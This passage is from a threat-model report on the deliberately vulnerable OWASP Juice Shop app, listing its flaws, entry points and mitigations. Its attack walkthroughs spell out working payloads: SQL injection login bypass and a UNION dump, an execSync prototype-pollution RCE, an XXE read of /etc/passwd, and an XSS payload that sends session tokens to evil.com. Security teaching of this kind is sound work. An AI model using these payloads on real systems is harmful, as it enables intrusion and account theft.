| 🔴 | **Monolith with no isolation boundary** — the Express app, both databases, and the file system share the same process space and trust context | A single RCE vulnerability (T-008) immediately reaches all data, secrets, and file system resources — there is no container, VM, or process boundary to slow an attacker down | [T-008](#t-008), [T-001](#t-001) |
| 🔴 | **Secrets in source code** — RSA private key, HMAC key, and cookie secret are string literals in tracked files | The repository is public. Any person who can read the code has all the cryptographic material needed to forge tokens and verify or pre-compute security answers without touching the server | [T-001](#t-001), [T-005](#t-005) |
| 🟠 | **Authentication and authorization decoupled from data access** — the ORM is called with raw string interpolation; ownership checks are absent from basket and review routes | SQL injection and IDOR are structurally enabled by the framework usage pattern, not by a single bug. Fixing one query does not fix the others | [T-002](#t-002), [T-007](#t-007), [T-010](#t-010) |
| 🟠 | **DomSanitizer bypass as a pattern** — `bypassSecurityTrustHtml()` is called in five separate components | XSS is not a one-off mistake; it is a recurring architectural decision to disable Angular's built-in protection. Each occurrence is an independent attack vector | [T-016](#t-016), [T-018](#t-018), [T-019](#t-019) |
| 🟠 | **Unauthenticated sensitive file serving** — serve-index on /ftp, /encryptionkeys, /support/logs | Three separate directories with operationally sensitive content are browsable and downloadable from the internet without authentication. There is no defense-in-depth to detect or rate-limit this reconnaissance | [T-023](#t-023), [T-024](#t-024), [T-026](#t-026) |

#### 2.3.3 Secret Management

- **Current state:** The RSA private key (`lib/insecurity.ts:24`), HMAC secret (`lib/insecurity.ts:43`), and cookie parser secret (`server.ts:289`) are all hardcoded string literals committed to the public GitHub repository.
- **Structural defects:** No environment variable loading, no secrets manager integration, no `.env` file with gitignore protection. The `encryptionkeys/` directory is publicly served, confirming the key pair in use.
- **Impact:** An attacker who clones the repository — or simply reads it on GitHub — has all cryptographic material needed to forge JWT tokens and pre-compute security answers for any user account.
- **Target architecture:** Load all secrets from `process.env` at startup with a fail-fast guard. Rotate all keys immediately on deployment. Store in HashiCorp Vault or cloud KMS for production.
- **Linked threats:** [T-001](#t-001), [T-005](#t-005), [T-021](#t-021)

#### 2.3.4 Authentication

The following diagram shows the JWT trust-establishment chain and where it breaks.

```mermaid
graph TB
    LOGIN["POST /rest/user/login\nroutes/login.ts:35"]:::risk
    SQLI["SQL Injection bypass\n' OR 1=1 --\nNo parameterization"]:::risk
    SIGN["jwt.sign(payload, privateKey)\nlib/insecurity.ts:57\nPrivate key hardcoded at :24"]:::risk
    STORE["localStorage.setItem('token', jwt)\nAngular front-end\nAccessible to XSS"]:::risk
    VERIFY["jws.verify(token, publicKey)\nlib/insecurity.ts:57\nNo algorithm enforcement"]:::risk
    ALGBYPASS["alg:none bypass\nexpress-jwt@0.1.3\nCWE-347"]:::risk
    ACCESS["Route protected by isAuthorized()\nAccepts forged token"]:::risk

    LOGIN -->|"Credential check via raw SQL"| SQLI
    SQLI -->|"Bypass succeeds — returns user row"| SIGN
    SIGN -->|"JWT issued with RS256 (private key from source)"| STORE
    STORE -->|"Token sent in Authorization header"| VERIFY
    VERIFY -->|"Algorithm not checked — alg:none accepted"| ALGBYPASS
    ALGBYPASS -->|"Fake token accepted"| ACCESS

    classDef person fill:#08427B,stroke:#073B6F,color:#fff
    classDef system fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    %% Trust Boundary Key:
    %% login → SQL: raw sequelize.query() bypassed with injection
    %% sign → store: token placed in localStorage (XSS-accessible)
    %% verify → access: algorithm not enforced (alg:none bypass)
```

#### 2.3.5 Authorization and Access Control

- **Current state:** `isAuthorized()` middleware in `lib/insecurity.ts:156` validates the JWT signature and decodes the payload. `isAccounting()` and `isAdmin()` check the `role` field from the decoded token.
- **Structural defects:** `isAuthorized` is applied inconsistently — GET /rest/admin/application-configuration has no auth at all; PUT /api/Products/:id has its auth middleware commented out. Ownership checks are absent from basket (T-010) and review (T-014) routes.
- **Impact:** Even with valid authentication, horizontal privilege escalation (IDOR) is trivially possible. Any authenticated user can read any basket, export any user's data, and modify any product.
- **Linked threats:** [T-010](#t-010), [T-014](#t-014), [T-027](#t-027), [T-028](#t-028)

#### 2.3.6 Input Validation and Output Encoding

- **Current state:** `sanitize-html` v1.4.2 is available in `lib/insecurity.ts:62` but Angular's DomSanitizer is explicitly bypassed with `bypassSecurityTrustHtml()` in five components. Helmet's XSS filter is disabled (`xssFilter: false` in server.ts). No CSP header is configured.
- **Structural defects:** The pattern of calling `bypassSecurityTrustHtml()` is used as a feature, not an exception. User-controlled content reaches innerHTML in product search, administration, and last-login-ip components.
- **Impact:** Stored XSS that renders in every user's browser, with access to `localStorage` where JWT tokens are stored. Admin-context XSS that executes for every admin page load.
- **Linked threats:** [T-016](#t-016), [T-017](#t-017), [T-018](#t-018), [T-019](#t-019), [T-026](#t-026), [T-027](#t-027)

#### 2.3.7 Separation and Isolation

- **Current state:** Single Express process handles all routes, serves all static files (including sensitive directories), and holds all in-process databases (SQLite via Sequelize and MarsDB). No microservices, no container networking between components.
- **Structural defects:** File system, databases, and business logic all share the same process context. A single RCE (T-008) instantly crosses all conceptual boundaries.
- **Linked threats:** [T-008](#t-008), [T-020](#t-020), [T-021](#t-021), [T-022](#t-022)

#### 2.3.8 Defense-in-Depth

- **Current state:** Helmet.js is installed but configured with `noSniff` and `frameguard` only. Morgan HTTP logging provides audit visibility but logs are publicly readable. express-rate-limit is applied to the password reset endpoint only.
- **Structural defects:** Every defensive layer has a gap that voids it — rate limiting absent from login, logging accessible unauthenticated, Helmet XSS filter disabled. No second layer activates when the first is bypassed.
- **Linked threats:** [T-006](#t-006), [T-012](#t-012), [T-026](#t-026)

#### 2.3.9 Overall Architecture Security Rating

🔴 **Critical gaps** — Juice Shop's architecture is designed to be broken at every layer. Hardcoded secrets, absent authorization enforcement, unauthenticated access to sensitive directories, and deliberate XSS enablement via DomSanitizer bypasses collectively make this application a teaching tool, not a defensible system. No architectural pattern — secrets management, API gateway, defense-in-depth, least privilege — is correctly implemented. Any one of five Critical findings is individually sufficient to fully compromise the application.

---

## 3. Attack Walkthroughs

### 3.1 Hardcoded RSA Key — Offline JWT Forgery (T-001)

This sequence shows how an attacker extracts the committed RSA private key and forges an admin JWT token to gain administrative access without interacting with the server's authentication endpoint.

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant GH as GitHub Public Repo
    participant JS as Juice Shop API

    ATK->>GH: GET https://github.com/juice-shop/juice-shop/blob/master/lib/insecurity.ts
    GH-->>ATK: Source file containing privateKey = BEGIN RSA PRIVATE KEY...
    note over ATK: Extract hardcoded RSA private key from lib/insecurity.ts:24

    ATK->>ATK: jwt.sign(payload=id=1 role=admin, algorithm=RS256, privateKey)
    note over ATK: Forge valid admin JWT offline — no server interaction needed

    ATK->>JS: GET /rest/admin/application-configuration
    note over JS: No auth middleware — returns config anyway
    JS-->>ATK: 200 OK — full application configuration

    ATK->>JS: GET /api/Users with Authorization=Bearer forgedAdminJWT
    JS->>JS: jws.verify(token, publicKey) — signature valid (key pair matches)
    JS-->>ATK: 200 OK — full user list with emails and tokens

    alt After M-001 — Remove hardcoded key
        ATK->>ATK: Attempts to use old key from source code
        JS-->>ATK: 401 Unauthorized — key rotated, old token rejected
    end
```

### 3.2 SQL Injection — Authentication Bypass and Database Dump (T-002, T-007)

This sequence shows the SQL injection attack path from unauthenticated access through authentication bypass and full database extraction.

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant EXP as Express routes/login.ts
    participant SEQ as Sequelize ORM
    participant DB as SQLite

    ATK->>EXP: POST /rest/user/login body=email=' OR 1=1--&password=x
    EXP->>SEQ: sequelize.query("SELECT * FROM Users WHERE email='' OR 1=1--' AND password='...'")
    note over SEQ: Raw string interpolation — no parameterization (routes/login.ts:35)
    SEQ->>DB: SQL query with injected OR 1=1
    DB-->>SEQ: First row from Users table (admin user)
    SEQ-->>EXP: User object returned — authentication succeeds
    EXP-->>ATK: 200 OK — admin JWT token issued

    ATK->>EXP: GET /rest/products/search?q=' UNION SELECT email,password,1,1,1,1,1,1,1 FROM Users--
    EXP->>SEQ: sequelize.query("SELECT * FROM Products WHERE name LIKE '%' UNION SELECT email,password,1,1,1,1,1,1,1 FROM Users--%'")
    SEQ->>DB: UNION SELECT extracting Users table
    DB-->>SEQ: All user rows — email + MD5 hashed passwords
    SEQ-->>EXP: Combined product and user results
    EXP-->>ATK: 200 OK — all emails and MD5 hashes returned

    note over ATK: MD5 hashes cracked offline with rainbow tables in minutes

    alt After M-002 — Parameterized queries
        ATK->>EXP: POST /rest/user/login body=email=' OR 1=1--&password=x
        EXP->>SEQ: findOne(where=email: req.body.email, replacements)
        SEQ-->>EXP: No rows — injection payload treated as literal string
        EXP-->>ATK: 401 Unauthorized
    end
```

### 3.3 Remote Code Execution — Prototype Pollution in B2B Order (T-008)

This sequence shows how an authenticated user escapes the `notevil` sandbox via prototype pollution to achieve arbitrary Node.js code execution.

```mermaid
sequenceDiagram
    participant ATK as Attacker (registered user)
    participant EXP as Express routes/b2bOrder.ts
    participant VM as Node.js vm.createContext
    participant NE as notevil sandbox
    participant FS as File System / ENV

    ATK->>EXP: POST /b2b/v2/orders with Authorization=Bearer validUserJWT
    note over ATK: Payload: orderLinesData=Object.assign(Object.prototype, require('child_process').execSync('id'))

    EXP->>EXP: isAuthorized() passes — any registered user qualifies
    EXP->>VM: vm.createContext(sandbox)
    EXP->>NE: safeEval(orderLinesData, sandbox, timeout=2000)
    note over NE: notevil sandbox — JavaScript evaluator with prototype pollution escape
    NE->>VM: Prototype pollution escapes sandbox boundary
    VM->>FS: execSync('id') executes on host Node.js process
    FS-->>EXP: uid=1000(node) command output returned

    EXP-->>ATK: 200 OK — RCE output embedded in response

    note over ATK: Attacker now has arbitrary code execution in Node.js process context

    alt After M-007 — Replace eval with schema validation
        ATK->>EXP: POST /b2b/v2/orders with prototype pollution payload
        EXP->>EXP: JSON.parse(orderLinesData)
        EXP->>EXP: ajv.validate(schema, parsed) — fails on unexpected prototype key
        EXP-->>ATK: 400 Bad Request — Invalid order data
    end
```

### 3.4 Stored XSS — Session Token Theft via DomSanitizer Bypass (T-016)

This sequence shows how a stored XSS payload injected into a product description executes in every victim's browser and exfiltrates their JWT token.

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant API as Juice Shop API
    participant DB as SQLite
    participant VIC as Victim Browser
    participant ANG as Angular SPA
    participant EXT as Attacker C2 Server

    ATK->>API: PUT /api/Products/1 with name="Juice<img src=x onerror=fetch('https://evil.com/?t='+localStorage.token)>"
    note over API: isAuthorized commented out (T-028) — no auth check
    API->>DB: UPDATE Products SET name=... WHERE id=1
    DB-->>API: Product updated
    API-->>ATK: 200 OK

    VIC->>API: GET /rest/products/search?q=juice
    API-->>VIC: Product list including XSS payload in name field

    VIC->>ANG: Render search results
    note over ANG: search-result.component.ts:132 calls bypassSecurityTrustHtml(product.name)
    ANG->>VIC: innerHTML set to XSS payload — script executes

    VIC->>EXT: GET https://evil.com/?t=eyJhbGci... (victim JWT from localStorage)
    EXT-->>ATK: Victim JWT delivered

    note over ATK: ATK replays victim JWT to make authenticated requests as victim

    alt After M-014 — Remove bypassSecurityTrustHtml
        VIC->>ANG: Render search results
        note over ANG: Angular sanitizes product.name before binding
        ANG->>VIC: Payload rendered as text — no script execution
    end
```

### 3.5 XXE — Server File Read via XML Upload (T-020)

This sequence shows how an XML file with an XXE payload reads arbitrary server files through the file upload endpoint.

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant UPL as routes/fileUpload.ts
    participant LIBXML as libxmljs2
    participant FS as File System

    ATK->>UPL: POST /file-upload with Content-Type=multipart/form-data
    note over ATK: XML payload: DOCTYPE foo SYSTEM "file:///etc/passwd" and entity reference

    UPL->>UPL: Check MIME type — XML accepted
    UPL->>LIBXML: libxml.parseXml(data, noent=true nocdata=true)
    note over LIBXML: noent=true enables external entity resolution (routes/fileUpload.ts:83)
    LIBXML->>FS: Open file:///etc/passwd for entity substitution
    FS-->>LIBXML: File contents returned
    LIBXML-->>UPL: Parsed XML with entity resolved to file contents

    UPL-->>ATK: 200 OK — response contains /etc/passwd contents

    alt After M-016 — Disable external entities
        ATK->>UPL: POST /file-upload with XXE payload
        UPL->>LIBXML: libxml.parseXml(data, noent=false nonet=true)
        LIBXML-->>UPL: External entity ignored — parse continues safely
        UPL-->>ATK: 200 OK — no file contents leaked
    end
```

---

## 4. Assets

The following assets are handled by Juice Shop. Classification reflects the sensitivity of the data and the real-world consequences of exposure.

_Classification legend: **Restricted** — exposure directly enables account takeover or code execution; **Confidential** — sensitive PII or credentials; **Internal** — operational data not intended for public access; **Public** — intentionally public._

| Asset | Classification | Description | Linked Threats |
|-------|---------------|-------------|----------------|
| JWT RSA Private Key | Restricted | Hardcoded RSA private key in `lib/insecurity.ts:24` — signs all session tokens | [T-001](#t-001) |
| HMAC Key for Security Answers | Restricted | Hardcoded HMAC-SHA256 key in `lib/insecurity.ts:43` — secures password reset | [T-005](#t-005) |
| User Credentials (email + hashed passwords) | Confidential | All registered user emails and MD5-hashed passwords in SQLite Users table | [T-002](#t-002), [T-004](#t-004), [T-007](#t-007) |
| Session Tokens (JWT) | Confidential | RS256 JWTs stored in `localStorage` — accessible to any JavaScript on the page | [T-017](#t-017), [T-016](#t-016) |
| User PII (address, payment card, orders) | Confidential | Delivery addresses, payment methods, and order history for all users | [T-010](#t-010), [T-007](#t-007) |
| Application Configuration | Internal | Full runtime config at `/rest/admin/application-configuration` — OAuth client IDs, feature flags | [T-011](#t-011) |
| Encryption Keys Directory | Internal | `/encryptionkeys/` served publicly — `jwt.pub` and `premium.key` | [T-024](#t-024) |
| FTP Directory | Internal | `/ftp/` with directory listing — `acquisitions.md`, `coupons_2013.md.bak`, `incident-support.kdbx` | [T-023](#t-023) |
| Access Logs | Internal | HTTP access logs at `/support/logs` — IP addresses, URLs, some PII in request bodies | [T-012](#t-012), [T-026](#t-026) |
| Product Catalog and Reviews | Public | Products and user reviews — directly modifiable via unauthenticated paths | [T-014](#t-014), [T-028](#t-028) |
| Prometheus Metrics | Internal | Application performance metrics at `/metrics` — request patterns, endpoint usage | [T-025](#t-025) |

---

## 5. Attack Surface

### 5.1 Unauthenticated Entry Points (8)

These entry points require no authentication and are reachable directly from the public internet.

| Entry Point | Protocol | Auth Required | Risk | Notes | Linked Threats |
|-------------|----------|--------------|------|-------|----------------|
| `POST /rest/user/login` | HTTP | No | 🔴 Critical | SQL injection via raw string interpolation; credential brute-force | [T-002](#t-002), [T-006](#t-006) |
| `GET /rest/products/search` | HTTP | No | 🔴 Critical | UNION-based SQL injection via query parameter; full user table extraction | [T-007](#t-007) |
| `POST /file-upload` | HTTP | No | 🔴 Critical | Accepts XML (XXE), ZIP (path traversal), YAML (bomb); no authentication | [T-020](#t-020), [T-021](#t-021), [T-013](#t-013) |
| `GET /ftp` | HTTP | No | 🟠 High | Directory listing; downloads backup files, `.bak`, `.kdbx` | [T-023](#t-023) |
| `GET /encryptionkeys` | HTTP | No | 🟠 High | Directory listing exposes `jwt.pub` and `premium.key` | [T-024](#t-024) |
| `GET /support/logs` | HTTP | No | 🟠 High | Directory listing and file download of application access logs | [T-012](#t-012), [T-026](#t-026) |
| `GET /metrics` | HTTP | No | 🟡 Medium | Prometheus metrics endpoint exposing internal request patterns | [T-025](#t-025) |
| `GET /rest/admin/application-configuration` | HTTP | No | 🟠 High | Full application config dump including OAuth client IDs, domain settings | [T-011](#t-011) |

### 5.2 Authenticated Entry Points (2)

These entry points require a valid JWT but are still exploitable by any registered user.

| Entry Point | Protocol | Auth Required | Risk | Notes | Linked Threats |
|-------------|----------|--------------|------|-------|----------------|
| `POST /b2b/v2/orders` | HTTP | Yes (any user) | 🔴 Critical | Prototype pollution via `notevil` bypass enables RCE | [T-008](#t-008) |
| `POST /profile/image/url` | HTTP | Yes (any user) | 🟠 High | SSRF — fetches arbitrary URLs server-side; reads internal services | [T-022](#t-022) |

---

## 6. Trust Boundaries

The Express monolith has minimal internal trust separation. All components share the same process, the same file system, and the same network interface.

| # | Boundary | From | To | Enforcement Mechanism | Key Weakness | Linked Threats |
|---|----------|------|----|-----------------------|-------------|----------------|
| 1 | Internet to Express Monolith | Public internet | Express process on port 3000 | None — direct TCP connection | No API gateway, no WAF, no rate limiting on most endpoints | [T-002](#t-002), [T-007](#t-007), [T-008](#t-008) |
| 2 | HTTP to SQLite via Sequelize ORM | Express route handlers | SQLite database | Sequelize ORM | Raw `sequelize.query()` calls bypass ORM parameterization in login and search | [T-002](#t-002), [T-007](#t-007) |
| 3 | HTTP to MarsDB NoSQL | Express route handlers | MarsDB in-process store | None | `$where` with server-side JavaScript evaluation in `trackOrder` | [T-009](#t-009) |
| 4 | Browser to Angular SPA | Browser JavaScript | Angular component DOM | Angular DomSanitizer (bypassed) | `bypassSecurityTrustHtml()` called in 5 components — XSS executes in browser | [T-016](#t-016), [T-017](#t-017), [T-018](#t-018), [T-019](#t-019) |
| 5 | Server to External URLs | Express route handler | Internet URLs | URL scheme check | Weak check allows SSRF to internal services and cloud metadata | [T-022](#t-022) |
| 6 | Server to File System | Express route handlers | Local file system | Path check using `includes()` | ZIP extraction path check bypassable via traversal sequences | [T-020](#t-020), [T-021](#t-021) |

The most critical boundary failure is **Boundary 1** — there is no protection layer between the internet and the application server. All six boundaries have enforcement mechanisms that are either absent or bypassable.

---

## 7. Identified Security Controls

**Gap summary:** The most critical control gaps are: (1) no algorithm enforcement on JWT verification enables alg:none bypass; (2) the RSA private key and all other secrets are hardcoded in source code — no secrets management exists; (3) Angular's XSS protection is deliberately disabled via `bypassSecurityTrustHtml()` in five components; (4) SQL parameterization is absent on the two highest-risk endpoints (login and search); (5) `isAuthorized` middleware is commented out on `PUT /api/Products/:id` and entirely absent from admin configuration endpoints.

_Legend: ✅ Adequate | ⚠️ Partial | 🔶 Weak | ❌ Missing_

| Domain | Control | Implementation | Effectiveness | Linked Threats |
|--------|---------|----------------|---------------|----------------|
| IAM | JWT Authentication (express-jwt) | [`lib/insecurity.ts:56`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:56) — `expressJwt` with `publicKey` | ⚠️ Partial | [T-003](#t-003) — no algorithm enforcement |
| IAM | Rate limiting on password reset | [`server.ts:343`](vscode://file/home/mrohr/juice-shop/server.ts:343) — `express-rate-limit` on `/rest/user/reset-password` | ⚠️ Partial | [T-006](#t-006) — absent from login |
| Authorization | Role-based access control (isAccounting) | [`lib/insecurity.ts:156`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:156) — role check on JWT decoded payload | ⚠️ Partial | [T-027](#t-027), [T-028](#t-028) |
| Authorization | isAuthorized middleware | [`server.ts:355–397`](vscode://file/home/mrohr/juice-shop/server.ts:355) — applied selectively to routes | 🔶 Weak | [T-011](#t-011), [T-028](#t-028) — commented out on PUT /api/Products/:id |
| Data Protection | Password hashing (MD5) | [`lib/insecurity.ts:42`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:42) — `crypto.createHash('md5')` | ❌ Missing | [T-004](#t-004) — MD5 is not a password hashing function |
| Data Protection | HMAC for security answers | [`lib/insecurity.ts:43`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:43) — HMAC-SHA256 with hardcoded key | 🔶 Weak | [T-005](#t-005) — hardcoded key in source |
| Data Protection | JWT stored in localStorage | `frontend/src/app/core/authentication.service.ts` _(file not found at review time)_ | ❌ Missing | [T-017](#t-017) — accessible to XSS |
| Input Validation | sanitize-html (v1.4.2 outdated) | [`lib/insecurity.ts:62`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:62) — `sanitizeHtmlLib` | 🔶 Weak | [T-016](#t-016) — bypassed by `bypassSecurityTrustHtml` |
| Input Validation | Helmet.js partial headers | [`server.ts:185`](vscode://file/home/mrohr/juice-shop/server.ts:185) — `noSniff + frameguard` only; `xssFilter` disabled | 🔶 Weak | [T-016](#t-016), [T-026](#t-026) |
| Input Validation | SQL parameterization | Routes using raw `sequelize.query()` | ❌ Missing | [T-002](#t-002), [T-007](#t-007) — login and search unparameterized |
| Input Validation | Content Security Policy | No CSP header configured | ❌ Missing | [T-016](#t-016), [T-018](#t-018), [T-019](#t-019) |
| Audit and Logging | Morgan HTTP access logging | [`server.ts:338`](vscode://file/home/mrohr/juice-shop/server.ts:338) — combined format to rotating file | ⚠️ Partial | [T-012](#t-012), [T-026](#t-026) — logs publicly accessible |
| Infrastructure | CORS wildcard | [`server.ts:181–182`](vscode://file/home/mrohr/juice-shop/server.ts:181) — `cors()` without origin restriction | 🔶 Weak | [T-029](#t-029) — any origin accepted |
| Infrastructure | Docker containerization | [`Dockerfile`](vscode://file/home/mrohr/juice-shop/Dockerfile) — non-root user (UID 65532) | ⚠️ Partial | No network policy; app reachable on port 3000 |
| Dependency | SCA tooling CycloneDX SBOM | [`package.json` scripts.sbom](vscode://file/home/mrohr/juice-shop/package.json) — `cyclonedx-npm` | ⚠️ Partial | SBOM generated but not continuously monitored |
| Security Testing | Cypress E2E tests | [`cypress.config.ts`](vscode://file/home/mrohr/juice-shop/cypress.config.ts) — E2E test suite | ⚠️ Partial | No security-focused test cases for SQLi, XSS, JWT bypass |
| Secret Management | RSA private key, HMAC key, cookie secret | [`lib/insecurity.ts:24`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:24), [`:43`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:43), [`server.ts:289`](vscode://file/home/mrohr/juice-shop/server.ts:289) | ❌ Missing | [T-001](#t-001), [T-005](#t-005), [T-021](#t-021) — all hardcoded |


---

## 8. Threat Register

**Risk Distribution:** Critical: 5 · High: 19 · Medium: 6 · Low: 0 · **Total: 30**

**STRIDE Coverage:** Spoofing: 5 · Tampering: 6 · Repudiation: 1 · Information Disclosure: 11 · Denial of Service: 3 · Elevation of Privilege: 4

### 8.1 Critical (5)

Five Critical findings provide direct paths to authentication bypass, administrative privilege, or remote code execution without requiring prior compromise.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|----------------|------------|--------|------|-------------------|-------------|
| <a id="t-001"></a>T-001 | Auth Service | Tampering | The RSA private key is hardcoded in source code at [`lib/insecurity.ts:24`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:24). Anyone with read access to the repository (public GitHub) can extract this key and forge arbitrary JWT tokens with any role (admin, accounting, deluxe). Tokens signed with the hardcoded key are accepted by `expressJwt` as fully valid. [CWE-321](https://cwe.mitre.org/data/definitions/321.html) | High | Critical | 🔴 Critical | RS256 algorithm used; express-jwt validates signature | [M-001](#m-001) — Remove hardcoded key |
| <a id="t-002"></a>T-002 | Auth Service | Spoofing | The login route ([`routes/login.ts:35`](vscode://file/home/mrohr/juice-shop/routes/login.ts:35)) constructs a raw SQL query using string interpolation. An attacker can bypass authentication using SQL injection payloads such as `' OR 1=1--` to log in as any user including admin without knowing the password. [CWE-89](https://cwe.mitre.org/data/definitions/89.html) | High | Critical | 🔴 Critical | Password is MD5-hashed before comparison; no parameterization | [M-002](#m-002) — Parameterize SQL queries |
| <a id="t-003"></a>T-003 | Auth Service | Elevation of Privilege | The `jws.verify()` call in [`lib/insecurity.ts:57`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:57) does not enforce the algorithm parameter. `express-jwt` version 0.1.3 (approximately 8 major versions behind) is known to accept `algorithm:none` JWTs. An attacker can craft a token with `alg:none`, strip the signature, and be accepted as any user including admin without possessing the private key. [CWE-347](https://cwe.mitre.org/data/definitions/347.html) | Medium | Critical | 🔴 Critical | RS256 specified in `jwt.sign()`; not enforced in `jws.verify()` | [M-003](#m-003) — Upgrade express-jwt |
| <a id="t-007"></a>T-007 | REST API | Information Disclosure | The product search endpoint ([`routes/search.ts:22`](vscode://file/home/mrohr/juice-shop/routes/search.ts:22)) uses raw SQL interpolation: `SELECT * FROM Products WHERE name LIKE '%${criteria}%'`. A UNION SELECT attack can extract the entire Users table including emails and MD5-hashed passwords, plus `sqlite_master` to retrieve the full database schema. The endpoint is unauthenticated and accepts GET requests. [CWE-89](https://cwe.mitre.org/data/definitions/89.html) | High | Critical | 🔴 Critical | Input truncated to 200 chars; no parameterization | [M-002](#m-002) — Parameterize SQL queries |
| <a id="t-008"></a>T-008 | REST API | Elevation of Privilege | The B2B order endpoint ([`routes/b2bOrder.ts:19`](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:19)) passes user-controlled `orderLinesData` to `safeEval()` inside a `vm.createContext` sandbox. The `notevil` library's sandbox can be escaped via prototype pollution, achieving arbitrary Node.js code execution on the server. The endpoint requires `isAuthorized` but any registered user can reach it. [CWE-94](https://cwe.mitre.org/data/definitions/94.html) | Medium | Critical | 🔴 Critical | `vm.createContext` sandbox; 2s timeout; `isAuthorized` required | [M-007](#m-007) — Disable eval endpoint |

### 8.2 High (19)

High findings enable significant data exposure, privilege escalation within the application, or exploitation of multiple users via XSS.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|----------------|------------|--------|------|-------------------|-------------|
| <a id="t-004"></a>T-004 | Auth Service | Information Disclosure | Passwords are hashed with MD5 ([`lib/insecurity.ts:42`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:42)). MD5 is not a password hashing function; it is fast and preimage-invertible via rainbow tables. A full database dump obtained via SQL injection (T-007) yields all user passwords in crackable form within minutes using public tools. [CWE-916](https://cwe.mitre.org/data/definitions/916.html) | High | High | 🟠 High | Hash applied before storage; no salt | [M-004](#m-004) — Replace MD5 with bcrypt |
| <a id="t-005"></a>T-005 | Auth Service | Elevation of Privilege | The security answer is verified using HMAC-SHA256 with a hardcoded key `pa4qacea4VK9t9nGv7yZtwmj` ([`lib/insecurity.ts:43`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:43)). An attacker who reads the source code knows the exact HMAC key and can pre-compute answers for any security question, enabling password reset for any account. [CWE-321](https://cwe.mitre.org/data/definitions/321.html) | Medium | High | 🟠 High | Rate limit on reset-password; HMAC-SHA256 used | [M-005](#m-005) — Load HMAC key from env |
| <a id="t-009"></a>T-009 | REST API | Information Disclosure | The order tracking endpoint ([`routes/trackOrder.ts:17`](vscode://file/home/mrohr/juice-shop/routes/trackOrder.ts:17)) queries MarsDB using `$where` which executes server-side JavaScript. An attacker can inject operators to enumerate all orders, leaking order data for all customers. The endpoint is unauthenticated. [CWE-943](https://cwe.mitre.org/data/definitions/943.html) | High | High | 🟠 High | Input sanitization applied when challenge is disabled | [M-008](#m-008) — Replace $where operator |
| <a id="t-010"></a>T-010 | REST API | Information Disclosure | The basket endpoint `GET /rest/basket/:id` ([`routes/basket.ts:17`](vscode://file/home/mrohr/juice-shop/routes/basket.ts:17)) does not verify that the requested basket ID belongs to the authenticated user — a classic IDOR. The `dataExport` endpoint ([`routes/dataExport.ts:26`](vscode://file/home/mrohr/juice-shop/routes/dataExport.ts:26)) uses `req.body.UserId` rather than the authenticated user's ID, allowing export of any user's data. [CWE-639](https://cwe.mitre.org/data/definitions/639.html) | High | High | 🟠 High | `isAuthorized` on basket route; no ownership check | [M-009](#m-009) — Add ownership checks |
| <a id="t-011"></a>T-011 | REST API | Information Disclosure | `GET /rest/admin/application-configuration` and `GET /rest/admin/application-version` ([`server.ts:604–605`](vscode://file/home/mrohr/juice-shop/server.ts:604)) are served without any authentication middleware. The response includes the full runtime config object including Google OAuth client ID, email domain, and chatbot settings, aiding reconnaissance for subsequent attacks. [CWE-200](https://cwe.mitre.org/data/definitions/200.html) | High | Medium | 🟠 High | None | [M-010](#m-010) — Authenticate admin endpoints |
| <a id="t-014"></a>T-014 | REST API | Tampering | The product reviews endpoint `PUT /rest/products/:id/reviews` allows any authenticated user to update any review regardless of authorship — no ownership check. The PATCH endpoint requires `isAuthorized` but the underlying handler does not validate reviewer identity, allowing review manipulation. [CWE-639](https://cwe.mitre.org/data/definitions/639.html) | High | Medium | 🟠 High | `isAuthorized` on PATCH; no authorship check | [M-009](#m-009) — Add ownership checks |
| <a id="t-015"></a>T-015 | REST API | Spoofing | `GET /redirect?to=<url>` ([`routes/redirect.ts`](vscode://file/home/mrohr/juice-shop/routes/redirect.ts)) validates the target against a whitelist but the validation can be bypassed by URL parsing quirks. An attacker can craft redirect URLs pointing to phishing pages while appearing to come from the trusted Juice Shop domain. [CWE-601](https://cwe.mitre.org/data/definitions/601.html) | Medium | Medium | 🟠 High | `isRedirectAllowed` allowlist; bypass possible | [M-013](#m-013) — Fix open redirect |
| <a id="t-016"></a>T-016 | Frontend SPA | Tampering | The search result component ([`frontend/src/app/search-result/search-result.component.ts:132`](vscode://file/home/mrohr/juice-shop/frontend/src/app/search-result/search-result.component.ts:132)) calls `bypassSecurityTrustHtml` on product descriptions fetched from the server. A stored XSS payload injected into a product description is rendered as trusted HTML in every user's browser, enabling session theft via `localStorage` access. [CWE-79](https://cwe.mitre.org/data/definitions/79.html) | High | High | 🟠 High | Angular default sanitization explicitly disabled | [M-014](#m-014) — Remove bypassSecurityTrustHtml |
| <a id="t-017"></a>T-017 | Frontend SPA | Information Disclosure | JWT session tokens are stored in `localStorage`. Any JavaScript executing on the page — including stored XSS (T-016), third-party scripts, or malicious browser extensions — can read `localStorage` and exfiltrate session tokens, enabling full account takeover. [CWE-312](https://cwe.mitre.org/data/definitions/312.html) | High | High | 🟠 High | RS256 JWT; 6-hour expiry; no `httpOnly` cookie | [M-015](#m-015) — Move JWT to httpOnly cookie |
